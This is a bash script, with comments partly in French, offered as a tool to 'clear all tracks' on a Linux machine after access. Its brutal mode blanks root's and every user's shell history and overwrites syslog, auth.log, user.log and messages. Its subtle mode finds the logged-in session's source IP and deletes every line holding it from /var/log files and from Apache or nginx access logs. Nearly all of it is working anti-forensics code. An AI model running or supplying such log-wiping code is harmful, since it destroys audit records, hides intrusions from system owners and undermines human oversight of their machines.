#!/bin/bash

#.  Description : Script to clear all tracks on a Linux Machine
#.  mode bourrin -b qui clear tout et -s "subtil way"

usage() {

  script_name=$(basename $0)
  echo -e "This is the list of available options: "
  echo -e "\t  -b : The brutal way of clearing logs."
  echo -e "\t  -s : The subtil way of clearing logs."
}

brutal_way() {
echo "Cleaning all logs..."
history -cw
echo " " > /root/.*history
echo " " > /var/log/syslog
echo " " > /var/log/auth.log
echo " " > /var/log/user.log
echo " " > /var/log/messages

##Effacer tous les bash_history de tous les users à la sauvage
users=$(ls /home/)
tab=($users)
for i in "${tab[@]}"
do
  echo " " > /home/${i}/.*history

done
}

##Fonction to find all modified files since last successfull login
find_modified_files() {
old=$(last | head -n 1 | awk '{print $7}')
new=$(date | awk '{print $5}' | awk -F ":" '{print $1 ":" $2}')

IFS=: read old_hour old_min <<< "$old"
IFS=: read hour min <<< "$new"

# convert the date "1970-01-01 hour:min:00" in seconds from Unix EPOCH time
sec_old=$(date -d "1970-01-01 $old_hour:$old_min:00" +%s)
sec_new=$(date -d "1970-01-01 $hour:$min:00" +%s)
dif=$(( (sec_new - sec_old) / 60))
echo $dif

# find all linux files modified since the dif
find /var/log -type f -mmin -$dif -print
}

subtil_way() {

from=$(who | cut -d"(" -f2 | cut -d")" -f1 | tail -1)

##On récupère tous les fichiers logs qui contiennent l'IP de provenance et on efface les lignes correspondantes

echo "Cleaning all logs..."
find_modified_files
find /var/log/ -type f -exec grep -H "${from}" {} \; > /tmp/tmp.txt
sed 's/\/var\/log/\n&/g' /tmp/tmp.txt > /tmp/tmp2.txt
cat /tmp/tmp2.txt | awk -F ':' '{print $1}' | sort -u > /tmp/log_files.txt
sed -i '/^$/d' /tmp/log_files.txt
cat /tmp/log_files.txt | grep /var | while read line
do
  sed -i "/${from}/d" $line > /dev/null 2>&1
done

read -p "Do you want to clear HTTP logs [Yes/no] ?" choice
case "${choice}" in
  Y|y|yes)
    clear_http
    ;;
  N|n|no)
    echo "HTTP logs won't be cleaned"
    break
    ;;
  *)
  echo "Make a choice"
  ;;
esac

rm /tmp/*.txt
history -cw
}

clear_http() {
##Efface toutes les lignes dans le access_log, à voir pour rajouter le error
web_server=$(lsof -i | grep LISTEN | grep http | head -n 1 | awk '{print $1}')
case ${web_server} in
  apache2)
    apache2_RHEL_dir="/etc/httpd/"
    apache2_DEB_dir="/etc/apache2/"
    if [ -d ${apache2_RHEL_dir} ];then
      grep access.log ${apache2_RHEL_dir}/conf.d/* > /tmp/vhost_logs.txt
      cat /tmp/vhosts_logs.txt | awk '{print $3}' > /tmp/vhost_logs2.txt
      ##Mode bourrin : ON
      cat /tmp/vhost_logs2.txt | while read line
        do
          if [[ -f "${line}" ]]; then
            sed -i "/${from}/d" $line > /dev/null 2>&1
          fi
        done

     elif [ -d ${apache2_DEB_dir} ];then
      grep access.log ${apache2_DEB_dir}/sites-enabled/* > /tmp/vhost_logs.txt
      cat /tmp/vhost_logs.txt | awk '{print $3}' > /tmp/vhost_logs2.txt
      ##Mode bourrin : ON
      cat /tmp/vhost_logs2.txt | while read line
        do
          if [[ -f "${line}" ]]; then
            sed -i "/${from}/d" $line > /dev/null 2>&1
          fi
        done
    fi
    ;;
  nginx)
    nginx_dir="/etc/nginx/"
    if [ -d ${nginx_dir} ]; then
      grep access.log ${nginx_dir}/sites-enabled/* > /tmp/vhost_logs.txt
      cat /tmp/vhost_logs.txt | awk '{print $3}' > /tmp/vhost_logs2.txt
      ##Mode bourrin : ON
      cat /tmp/vhost_logs2.txt | while read line
        do
          ##On enlève toutes les lignes dans les logs
          file=$(echo $line | awk -F ";" '{print $1}')
          if [[ -f "${file}" ]]; then
          sed -i "/${from}/d" $line > /dev/null 2>&1
          fi
        done
    fi
    ;;
  *)
   echo "Unknown web server. Script will exit."
   exit 1
   ;;
esac

}

if [ -z ${1} ]
then
  usage
fi

while getopts "bs" opt; do
  case $opt in
    b) brutal_way
      ;;
    s) subtil_way
      ;;
  esac
done

exit 0
